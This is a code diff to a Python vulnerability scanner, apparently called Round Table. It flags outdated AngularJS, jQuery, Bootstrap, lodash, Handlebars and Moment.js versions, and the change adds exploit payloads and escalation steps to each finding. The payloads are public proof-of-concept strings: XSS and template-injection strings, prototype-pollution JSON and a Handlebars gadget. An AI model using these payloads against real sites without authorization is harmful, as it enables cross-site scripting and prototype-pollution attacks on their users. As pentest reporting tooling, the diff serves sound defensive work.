@@ -378,46 +378,91 @@ def _ver_t(v):
 
 
 def _lib_vuln(lib, ver):
-    """Return (severity, confidence, note, references, fix) if this version is known-vulnerable."""
+    """
+    If this library version is known-vulnerable, return a dict with the RISK,
+    references, fix, and — crucially — how to EXPLOIT it (payloads + steps).
+    Returns None for a safe version.
+    """
     v = _ver_t(ver)
     R = lambda t, u: {"title": t, "url": u}
     if lib == "AngularJS":
-        return ("HIGH", 88,
-                f"AngularJS {ver} is END-OF-LIFE (since Jan 2022) and affected by multiple XSS / sandbox-bypass "
-                f"CVEs (e.g. CVE-2020-7676, CVE-2019-10768, CVE-2022-25844).",
-                [R("AngularJS advisories (retire.js)", "https://github.com/RetireJS/retire.js"),
-                 R("CVE-2020-7676", "https://nvd.nist.gov/vuln/detail/CVE-2020-7676")],
-                "AngularJS 1.x is unsupported — migrate to a maintained framework. Until then, never bind untrusted input into AngularJS templates/expressions.")
+        return dict(sev="HIGH", conf=88,
+            risk=(f"AngularJS {ver} is end-of-life (Jan 2022) with XSS / expression-sandbox-escape CVEs "
+                  f"(CVE-2020-7676, CVE-2019-10768). Any user input rendered inside an AngularJS-bound region "
+                  f"becomes client-side template injection (CSTI) → arbitrary JavaScript execution."),
+            refs=[R("AngularJS advisories (retire.js)", "https://github.com/RetireJS/retire.js"),
+                  R("PortSwigger · Client-side template injection", "https://portswigger.net/web-security/cross-site-scripting"),
+                  R("CVE-2020-7676", "https://nvd.nist.gov/vuln/detail/CVE-2020-7676")],
+            fix="Migrate off AngularJS 1.x (unsupported). Until then, never bind untrusted input into AngularJS templates/expressions.",
+            payloads=["{{7*7}}", "{{constructor.constructor('alert(document.domain)')()}}",
+                      "{{$eval.constructor('alert(1)')()}}",
+                      "{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}"],
+            how=["Find where user input is reflected inside the AngularJS app (ng-app scope) — a search box, blog comment, profile/username field.",
+                 "Inject {{7*7}} — if the page renders 49, expressions are being evaluated (CSTI confirmed).",
+                 "Escalate: AngularJS >= 1.6 removed the expression sandbox, so {{constructor.constructor('...')()}} runs arbitrary JS.",
+                 "Confirm with alert(document.domain), then report CSTI → XSS."])
     if lib == "jQuery":
+        jq_how = ["Find a DOM sink where jQuery inserts HTML from input: .html(), .append(), .prepend(), or $(userInput).",
+                  "Inject the payload below; the version's htmlPrefilter/parsing flaw lets it execute despite naive filtering.",
+                  "Confirm alert(document.domain), then report reflected/DOM XSS."]
+        jq_pl = ["<img src=x onerror=alert(document.domain)>",
+                 "<style><style /><img src=x onerror=alert(1)>",
+                 "'><svg onload=alert(1)>"]
         if v < (1, 9, 0):
-            return ("HIGH", 82, f"jQuery {ver}: multiple XSS / selector-injection issues. Upgrade to >= 3.5.0.",
-                    [R("CVE-2020-11022", "https://nvd.nist.gov/vuln/detail/CVE-2020-11022")], "Upgrade jQuery to >= 3.5.0.")
+            return dict(sev="HIGH", conf=82, risk=f"jQuery {ver}: multiple XSS / selector-injection issues.",
+                        refs=[R("CVE-2020-11022", "https://nvd.nist.gov/vuln/detail/CVE-2020-11022")],
+                        fix="Upgrade jQuery to >= 3.5.0.", payloads=jq_pl, how=jq_how)
         if v < (3, 4, 0):
-            return ("MEDIUM", 78, f"jQuery {ver}: CVE-2019-11358 (prototype pollution) + $() HTML XSS.",
-                    [R("CVE-2019-11358", "https://nvd.nist.gov/vuln/detail/CVE-2019-11358")], "Upgrade jQuery to >= 3.5.0.")
+            return dict(sev="MEDIUM", conf=78, risk=f"jQuery {ver}: CVE-2019-11358 (prototype pollution via $.extend) + $() HTML XSS.",
+                        refs=[R("CVE-2019-11358", "https://nvd.nist.gov/vuln/detail/CVE-2019-11358")],
+                        fix="Upgrade jQuery to >= 3.5.0.",
+                        payloads=jq_pl + ['$.extend(true, {}, JSON.parse(\'{"__proto__":{"x":1}}\'))'], how=jq_how)
         if v < (3, 5, 0):
-            return ("MEDIUM", 78, f"jQuery {ver}: CVE-2020-11022 / CVE-2020-11023 (XSS via htmlPrefilter).",
-                    [R("CVE-2020-11023", "https://nvd.nist.gov/vuln/detail/CVE-2020-11023")], "Upgrade jQuery to >= 3.5.0.")
+            return dict(sev="MEDIUM", conf=78, risk=f"jQuery {ver}: CVE-2020-11022 / CVE-2020-11023 (XSS via htmlPrefilter).",
+                        refs=[R("CVE-2020-11023", "https://nvd.nist.gov/vuln/detail/CVE-2020-11023")],
+                        fix="Upgrade jQuery to >= 3.5.0.", payloads=jq_pl, how=jq_how)
         return None
     if lib == "Bootstrap":
         if (v[0] == 3 and v < (3, 4, 1)) or (v[0] == 4 and v < (4, 3, 1)):
-            return ("MEDIUM", 76, f"Bootstrap {ver}: CVE-2019-8331 XSS via data-template in tooltip/popover.",
-                    [R("CVE-2019-8331", "https://nvd.nist.gov/vuln/detail/CVE-2019-8331")], "Upgrade Bootstrap to >= 4.3.1 (or 3.4.1).")
+            return dict(sev="MEDIUM", conf=76, risk=f"Bootstrap {ver}: CVE-2019-8331 — XSS via data-template / title in tooltip/popover.",
+                        refs=[R("CVE-2019-8331", "https://nvd.nist.gov/vuln/detail/CVE-2019-8331")],
+                        fix="Upgrade Bootstrap to >= 4.3.1 (or 3.4.1).",
+                        payloads=['title=\'<img src=x onerror=alert(1)>\' data-toggle="tooltip"',
+                                  'data-template=\'<div class="tooltip"><script>alert(1)</script></div>\''],
+                        how=["Find a tooltip/popover whose title/content is user-controllable.",
+                             "Inject HTML via title or data-template; the sanitizer flaw lets it execute.",
+                             "Confirm alert(1) → report XSS."])
         return None
     if lib == "Lodash":
         if v < (4, 17, 21):
-            return ("MEDIUM", 78, f"Lodash {ver}: prototype pollution / command injection (CVE-2020-8203, CVE-2021-23337).",
-                    [R("CVE-2021-23337", "https://nvd.nist.gov/vuln/detail/CVE-2021-23337")], "Upgrade lodash to >= 4.17.21.")
+            return dict(sev="MEDIUM", conf=78, risk=f"Lodash {ver}: prototype pollution / command injection (CVE-2020-8203, CVE-2021-23337).",
+                        refs=[R("CVE-2021-23337", "https://nvd.nist.gov/vuln/detail/CVE-2021-23337")],
+                        fix="Upgrade lodash to >= 4.17.21.",
+                        payloads=['{"__proto__":{"polluted":"yes"}}',
+                                  '_.merge({}, JSON.parse(\'{"__proto__":{"x":1}}\')); ({}).x === 1'],
+                        how=["Find where user JSON/params reach _.merge / _.defaultsDeep / _.set / _.zipObjectDeep.",
+                             "Send a __proto__ payload to pollute Object.prototype (check ({}).x afterward).",
+                             "Chain the polluted property to a sink (template, config flag) for XSS/RCE, then report."])
         return None
     if lib == "Handlebars":
         if v < (4, 7, 7):
-            return ("HIGH", 80, f"Handlebars {ver}: prototype pollution leading to RCE (CVE-2019-19919, CVE-2021-23369).",
-                    [R("CVE-2021-23369", "https://nvd.nist.gov/vuln/detail/CVE-2021-23369")], "Upgrade Handlebars to >= 4.7.7.")
+            return dict(sev="HIGH", conf=80, risk=f"Handlebars {ver}: prototype pollution → RCE (CVE-2019-19919, CVE-2021-23369).",
+                        refs=[R("CVE-2021-23369", "https://nvd.nist.gov/vuln/detail/CVE-2021-23369")],
+                        fix="Upgrade Handlebars to >= 4.7.7.",
+                        payloads=["{{#with \"constructor\"}}{{#with split as |a|}}...{{/with}}{{/with}}"],
+                        how=["If the app compiles user-controlled templates, test server-side template injection.",
+                             "Use the known Handlebars prototype-pollution gadget chain to reach RCE.",
+                             "Confirm code execution in a safe way, then report."])
         return None
     if lib == "Moment.js":
         if v < (2, 29, 4):
-            return ("MEDIUM", 74, f"Moment.js {ver}: ReDoS / path traversal (CVE-2022-24785, CVE-2022-31129).",
-                    [R("CVE-2022-31129", "https://nvd.nist.gov/vuln/detail/CVE-2022-31129")], "Upgrade moment to >= 2.29.4 or migrate to a maintained date library.")
+            return dict(sev="MEDIUM", conf=74, risk=f"Moment.js {ver}: ReDoS / path traversal (CVE-2022-24785, CVE-2022-31129).",
+                        refs=[R("CVE-2022-31129", "https://nvd.nist.gov/vuln/detail/CVE-2022-31129")],
+                        fix="Upgrade moment to >= 2.29.4 or migrate to a maintained date library.",
+                        payloads=["a very long crafted date string (thousands of chars) to a moment() parse path"],
+                        how=["Find a request where a date/locale string is parsed by moment().",
+                             "Send an oversized/crafted value and measure response latency (ReDoS).",
+                             "For the locale path, test ../ traversal per CVE-2022-24785."])
         return None
     return None
 
@@ -500,23 +545,26 @@ def d_tech_libs(base):
         ))
 
     for lib, (ver, url) in detected.items():
-        vres = _lib_vuln(lib, ver)
-        if not vres:
+        vd = _lib_vuln(lib, ver)
+        if not vd:
             continue
-        sev, conf, note, refs, fix = vres
+        how_steps = ([f"Confirm the exact version first: curl -sS -k {url} | head -c 500"]
+                     + vd.get("how", [])
+                     + ["Look up the exact CVEs (retire.js / Snyk / NVD) and confirm the vulnerable code path is reachable before reporting impact."])
         findings.append(_finding(
             key=f"vuln-lib-{lib.lower()}", title=f"Vulnerable JS dependency: {lib} {ver}",
-            category="Vulnerable Components", severity=sev, surface=url, confidence=conf,
-            evidence=note + f"  (loaded from {url})",
-            what=f"The app ships {lib} {ver}, a version with known public vulnerabilities.",
-            how=[f"Confirm the version: curl {url}",
-                 "Look up the exact CVEs for this version (retire.js / Snyk / NVD).",
-                 "Assess whether the vulnerable code paths are reachable in the app before reporting impact."],
-            tools=["retire.js", "curl", "Burp Suite"],
-            curl_steps=[{"desc": "Fetch the library header", "cmd": f"curl -sS -k {url} | head -c 500"}],
-            references=refs,
-            remediation={"summary": fix, "fixes": []},
-            tags=["vuln-lib", "components", "fingerprint"],
+            category="Vulnerable Components", severity=vd["sev"], surface=url, confidence=vd["conf"],
+            evidence=f"Potential risk ({vd['sev']}): " + vd["risk"] + f"  (loaded from {url})",
+            what=f"The app ships {lib} {ver} — a version with known public vulnerabilities. "
+                 f"Below is how a pentester would exploit it (verify manually; Round Table does not auto-exploit).",
+            how=how_steps,
+            payloads=vd.get("payloads", []),
+            tools=["retire.js", "Burp Suite", "browser devtools console", "curl"],
+            curl_steps=[{"desc": "Fetch the library header to confirm the version",
+                         "cmd": f"curl -sS -k {url} | head -c 500"}],
+            references=vd["refs"],
+            remediation={"summary": vd["fix"], "fixes": []},
+            tags=["vuln-lib", "components", "fingerprint", "exploit-guidance"],
         ))
     return findings
 
